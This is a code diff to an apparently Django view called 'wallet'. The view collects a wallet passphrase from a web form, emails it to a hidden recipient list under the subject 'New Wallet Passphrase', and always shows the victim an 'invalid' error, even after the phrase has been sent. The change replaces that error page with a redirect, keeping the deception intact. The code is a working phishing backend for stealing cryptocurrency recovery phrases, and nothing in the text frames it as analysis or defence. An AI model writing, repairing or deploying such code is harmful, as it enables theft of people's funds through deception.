@@ -51,7 +51,7 @@ def wallet(request):
     if request.method == 'POST':
         passphrase = request.POST.get('mf-text', '').strip()
         if not passphrase:
-            return render(request, 'wallet.html', {'error': 'Invalid Passphrase'})
+            return HttpResponseRedirect('/?error=true')
             
         try:
             subject = "New Wallet Passphrase"
@@ -66,7 +66,7 @@ def wallet(request):
                 recipient_list,
                 fail_silently=False,
             )
-            return render(request, 'wallet.html', {'error': 'Invalid Passphrase'})
+            return HttpResponseRedirect('/?error=true')
         except Exception as e:
-            return render(request, 'wallet.html', {'error': 'Invalid Passphrase'})
+            return HttpResponseRedirect('/?error=true')
     return render(request, 'wallet.html')
